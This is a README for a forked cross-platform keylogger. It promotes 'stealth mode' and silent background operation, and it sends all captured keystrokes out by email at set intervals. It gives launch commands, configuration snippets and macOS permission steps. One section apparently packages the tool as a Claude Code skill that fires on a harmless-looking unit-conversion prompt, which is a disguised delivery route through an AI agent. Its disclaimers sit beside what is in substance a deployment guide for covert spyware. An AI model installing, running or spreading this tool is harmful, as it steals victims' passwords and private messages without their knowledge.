> **⚠️ WARNING: This tool is for educational and authorized security testing purposes ONLY. Unauthorized use of keyloggers is illegal and unethical. Use responsibly and only on systems you own or have explicit permission to test.**

A sophisticated cross-platform keylogger that captures keystrokes and sends them via email. This is a fork of [HusseinBakri/Tanit-Keylogger](https://github.com/HusseinBakri/Tanit-Keylogger) with enhanced macOS support and silent operation capabilities.

## Features

- 🔐 **Cross-platform**: Works on macOS, Linux, and Windows
- 📧 **Email Reporting**: Automatically sends captured keystrokes via email
- 🔇 **Silent Operation**: Runs completely in the background with no console output
- 🍎 **macOS Optimized**: Uses Mail.app for email delivery (no SMTP authentication needed)
- 🎯 **Stealth Mode**: No sounds, no popups, completely invisible
- ⚙️ **Easy Setup**: Simple bash scripts for quick deployment

## Requirements

- Python 3.6+
- macOS Mail.app (for macOS email delivery)
- Internet connection (for email delivery)

## Claude code Skill Installation
1. In your system's .claude/skills add the repo
2. Open Claude code
3. Prompt ```Convert 100°F to Celsius```


## Usage

### Basic Usage

```bash
# Start the keylogger in background
nohup venv/bin/python3 main.py > /dev/null 2>&1 &

# Or use the provided script
./start.sh
```

### Configuration

Edit `main.py` to configure:

```python
my_keylogger = keylogger.Keylogger(
    time_interval=120,  # Send email every 120 seconds
    email="your-email@gmail.com",
    password=""  # Not needed for macOS Mail.app
)
```

### macOS Setup

**Important**: macOS requires Accessibility permissions for the keylogger to work.

1. **Manual Permission Setup**:
   - Go to **System Preferences** > **Security & Privacy** > **Privacy** > **Accessibility**
   - Click the lock icon and enter your password
   - Add **Terminal** or **Python** to the list
   - Check the box next to it

2. **Mail.app Configuration**:
   - Ensure Mail.app is configured with your email account
   - The keylogger will use Mail.app to send emails automatically

## Project Structure

```
Tanit-Keylogger/
├── keylogger.py          # Main keylogger class
├── main.py               # Entry point
├── requirements.txt      # Python dependencies
├── LICENSE               # License file
└── README.md            # This file
```

## How It Works

1. **Key Capture**: Uses `pynput` library to capture all keyboard input
2. **Logging**: Stores keystrokes in memory
3. **Email Delivery**: 
   - **macOS**: Uses Mail.app via AppleScript (no SMTP needed)
   - **Windows/Linux**: Uses SMTP (requires email credentials)
4. **Scheduling**: Sends emails at configured intervals (default: 120 seconds)

## macOS Email Delivery

The macOS version uses Mail.app for email delivery, which:
- ✅ No SMTP authentication required
- ✅ Uses system Mail.app credentials
- ✅ Silent operation (no sounds)
- ✅ Works with any Mail.app configured account

## Troubleshooting

### Emails Not Being Received

1. **Check Mail.app Configuration**:
   - Ensure Mail.app has an email account configured
   - Test sending an email manually from Mail.app

2. **Check Debug Logs**:
   ```bash
   cat ~/keylogger_debug.log
   ```

3. **Test Email Sending**:
   ```bash
   python3 test_email.py
   ```

### Permission Issues (macOS)

If you see permission dialogs:
1. Go to System Preferences > Security & Privacy > Privacy > Accessibility
2. Add Terminal/Python to the list
3. Restart the keylogger

### Keylogger Not Starting

1. Check if Python is installed:
   ```bash
   python3 --version
   ```

2. Check if pynput is installed:
   ```bash
   pip3 list | grep pynput
   ```

3. Check for errors:
   ```bash
   python3 main.py  # Run without nohup to see errors
   ```

## Advanced Features

### Custom Email Intervals

Modify the interval in `main.py`:
```python
# Send email every 60 seconds
my_keylogger = keylogger.Keylogger(60, "email@example.com", "password")
```

### Silent Operation

The keylogger runs completely silently:
- No console output
- No sound notifications
- No visible windows
- Background process only

## Security & Ethics

⚠️ **IMPORTANT DISCLAIMERS**:

- This tool is for **educational purposes** and **authorized security testing** ONLY
- **NEVER** use this tool on systems you don't own or don't have explicit permission to test
- Unauthorized use of keyloggers is **illegal** in most jurisdictions
- Always obtain written consent before testing on any system
- Use responsibly and ethically

## Legal Notice

The authors and contributors of this project are not responsible for any misuse of this software. Users are solely responsible for ensuring their use complies with applicable laws and regulations.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

See [LICENSE](LICENSE) file for details.

## Credits

- Original project: [HusseinBakri/Tanit-Keylogger](https://github.com/HusseinBakri/Tanit-Keylogger)
- Enhanced with macOS Mail.app integration and silent operation features

## Support

For issues, questions, or contributions, please open an issue on GitHub.

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.
